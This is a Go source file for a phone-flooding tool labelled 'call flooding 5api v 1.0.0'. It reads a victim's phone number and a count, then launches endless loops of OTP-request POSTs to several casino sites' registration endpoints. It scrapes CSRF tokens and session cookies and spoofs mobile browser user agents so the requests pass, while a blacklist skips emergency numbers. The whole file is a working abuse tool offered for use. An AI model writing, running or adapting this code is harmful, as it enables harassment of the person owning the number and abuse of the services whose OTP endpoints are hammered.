package main

import (
  "fmt"
  "os/exec"
  "io/ioutil"
  "net/http"
  "strings"
  "time"
  "log"
  "math/rand"
  "github.com/gookit/color"
)

func Contains(blacklist []string, value string) bool {

	for _, v := range blacklist {

		if v == value {
			return true
		}
	}
	return false
}

func randomString(l int) string {
	var pool = "abcdefghijklmnopqrstuvwxyzABCEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	bytes := make([]byte, l)
	for i := 0; i < l; i++ {
		bytes[i] = pool[rand.Intn(len(pool))]
	}
	return string(bytes)
}
func randt() {
  rand.Seed(time.Now().UTC().UnixNano())
}

func call1(phone string) {
  for {
    data := strings.NewReader("phoneNumber=" + phone)
    tr := &http.Transport {
      MaxIdleConns:       1, 
      IdleConnTimeout:    1 * time.Second,
      DisableCompression: true,
    }
  client := &http.Client{Transport: tr}
  req, err := http.NewRequest("POST", "https://www.ez-casino.org/_ajax_/v3/register/request-otp", data)
  if err != nil {
    break
  }
  req.Header.Add("Content-Type", "Application/x-www-form-urlencoded")
  req.Header.Add("X-Requested-With", "XMLHttpRequest")
  req.Header.Add("User-Agent", "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36")
  resp, err := client.Do(req)
  if err != nil {
    break
  }
  defer req.Body.Close()
  if resp.StatusCode != 200 {
    fmt.Printf("\r[\x1b[38;5;63m%s\x1b[0m] [response failed] call1]\n",time.Now().Format("15:04:05"))
    break
  } else {
    fmt.Printf("\r[\x1b[38;5;63m%s\x1b[0m] [success] call1 sent\n",time.Now().Format("15:04:05"))
  }
 }
}

func call2(phone string) {
  for {
    req, err := http.NewRequest("GET", "https://www.allcasino.bet/_ajax_/register", nil)
    tr := &http.Transport {
      MaxIdleConns:       1,
      IdleConnTimeout:    1 * time.Second,
      DisableCompression: true,
    }
    client := &http.Client{Transport: tr}
    if err != nil {
      break
    }
    resp, err := client.Do(req)
    if err != nil {
      break
    }
    defer resp.Body.Close()
    body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
      break
    }
    a := strings.Split(string(body), `<input type="hidden" id="request_otp__token" name="request_otp[_token]" value="`)
    if len(a) != 2 {
      fmt.Println(len(a))
    }
    token := strings.Split(a[1], `" />`)[0]
    setcookie := strings.Split(strings.Split(resp.Header["Set-Cookie"][0], `PHPSESSID=`)[1], `;`)[0]
    data := strings.NewReader("request_otp%5BphoneNumber%5D=" + phone + "&request_otp%5BtermAndCondition%5D=1&request_otp%5B_token%5D=" + token)
    req2, err := http.NewRequest("POST", "https://www.allcasino.bet/_ajax_/request-otp", data)
    client2 := &http.Client{Transport: tr}
    if err != nil {
      break
    }
    req2.Header.Add("Content-Type", "application/x-www-form-urlencoded")
    req2.Header.Add("Cookie", "PHPSESSID="+setcookie)
      res2, err := client2.Do(req2)
    if err != nil {
      break
    }
    defer res2.Body.Close()
    if res2.StatusCode != 200 {
      fmt.Printf("\r[\x1b[38;5;63m%s\x1b[0m] [response failed] call2]\n",time.Now().Format("15:04:05"))
      break
    } else {
      fmt.Printf("\r[\x1b[38;5;63m%s\x1b[0m] [success] call2 sent\n",time.Now().Format("15:04:05"))
    }
  }
}

func call3(phone string) {
  for {
    data := strings.NewReader("phoneNumber=" + phone)
    tr := &http.Transport {
      MaxIdleConns:       1, 
      IdleConnTimeout:    1 * time.Second,
      DisableCompression: true,
    }
  client := &http.Client{Transport: tr}
  req, err := http.NewRequest("POST", "https://v2.ez.casino/_ajax_/v3/register/request-otp", data)
  if err != nil {
    break
  }
  req.Header.Add("Content-Type", "Application/x-www-form-urlencoded")
  req.Header.Add("X-Requested-With", "XMLHttpRequest")
  req.Header.Add("User-Agent", "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36")
  resp, err := client.Do(req)
  if err != nil {
    break
  }
  defer req.Body.Close()
  if resp.StatusCode != 200 {
    fmt.Printf("\r[\x1b[38;5;63m%s\x1b[0m] [response failed] call1]\n",time.Now().Format("15:04:05"))
    break
  } else {
    fmt.Printf("\r[\x1b[38;5;63m%s\x1b[0m] [success] call1 sent\n",time.Now().Format("15:04:05"))
  }
 }
}

func call4(phone string) {
  for {
    req, err := http.NewRequest("GET", "https://ufaclub-69.com/_ajax_/register", nil)
    tr := &http.Transport {
      MaxIdleConns:       1,
      IdleConnTimeout:    1 * time.Second,
      DisableCompression: true,
    }
    client := &http.Client{Transport: tr}
    if err != nil {
      break
    }
    resp, err := client.Do(req)
    if err != nil {
      break
    }
    defer resp.Body.Close()
    body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
      break
    }
    a := strings.Split(string(body), `<input type="hidden" id="request_otp__token" name="request_otp[_token]" value="`)
    if len(a) != 2 {
      fmt.Println(len(a))
    }
    token := strings.Split(a[1], `" />`)[0]
    setcookie := strings.Split(strings.Split(resp.Header["Set-Cookie"][0], `PHPSESSID=`)[1], `;`)[0]
    data := strings.NewReader("request_otp%5BphoneNumber%5D=" + phone + "&request_otp%5BtermAndCondition%5D=1&request_otp%5B_token%5D=" + token)
    req2, err := http.NewRequest("POST", "https://ufaclub-69.com/_ajax_/request-otp", data)
    client2 := &http.Client{Transport: tr}
    if err != nil {
      break
    }
    req2.Header.Add("x-requested-with", "XMLHttpRequest")
    req2.Header.Add("user-agent", "Mozilla/5.0 (Linux; Android 10; PPA-LX2 Build/HUAWEIPPA-LX2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 Mobile Safari/537.36 HuaweiBrowser/14.0.5.302 HMSCore/6.13.0.301")
    //req2.Header.Add("content-type", "multipart/form-data; boundary=----WebKitFormBoundaryUei8B0djIHQdDMfZ")
    //req2.Header.Add("Content-Type", "application/x-www-form-urlencoded")
    req2.Header.Add("Cookie", "PHPSESSID="+setcookie)
      res2, err := client2.Do(req2)
    if err != nil {
      break
    }
    defer res2.Body.Close()
    if res2.StatusCode != 200 {
      fmt.Printf("\r[\x1b[38;5;63m%s\x1b[0m] [response failed] call2]\n",time.Now().Format("15:04:05"))
      break
    } else {
      fmt.Printf("\r[\x1b[38;5;63m%s\x1b[0m] [success] call2 sent\n",time.Now().Format("15:04:05"))
    }
  }
}



func api1(phone string, amount int) {
  call1(phone)
}
func api2(phone string, amount int) {
  call2(phone)
}
func api3(phone string, amount int) {
  call3(phone)
}
func api4(phone string, amount int) {
  call4(phone)
}

func main() {
  out, err := exec.Command("clear").Output()
  if err != nil {
    log.Fatalln(err)
  }
  output := string(out[:])
    fmt.Println(output)
  blacklist := []string{"191", "1190", "1192", "1193", "1196", "1197", "1154", "1155", "1134", "1669", "1691"}
	limit := 2000
	var number string
	var amount int
	color.Blue.Printf(`
	
   
     ██████╗ █████╗ ██╗     ██╗     
    ██╔════╝██╔══██╗██║     ██║     
    ██║     ███████║██║     ██║     
    ██║     ██╔══██║██║     ██║     
    ╚██████╗██║  ██║███████╗███████╗
     ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝
      
      
      call flooding 5api v 1.0.0
    
  
  `)
	fmt.Println()
	//fmt.Println("PHONE :")
	//rand.Seed(time.Now().UTC().UnixNano())
	//fmt.Sprintf("Start Time: %s\n", time.Now())
	//, .Format("15:04:05"))
	color.Blue.Printf("phonenumber : \n")
	fmt.Scanln(&number)
	//fmt.Println("AMOUNT :")
	color.Blue.Printf("amounta : \n")
	fmt.Scanln(&amount)
	if len([]rune(number)) == 10 && number[0] == '0' && !Contains(blacklist, number) {
		if amount <= limit {
			fmt.Println()
			for i := 0; i < amount; i++ {
			  done := 0
			  switch rand.Intn(done + 1) {
			    case 0:
			    go api1(number,amount) //waiting config deley
			    case 1:
			    go api2(number,amount)
			    case 2:
			    go api3(number,amount)
			    case 3:
			    go api4(number,amount)
			  }
			}
			
			fmt.Scanln()

		} else {
			fmt.Printf("The limit is %d", limit)
		}
	} else {
		fmt.Println("Number is invalid or blacklisted")
	}
}
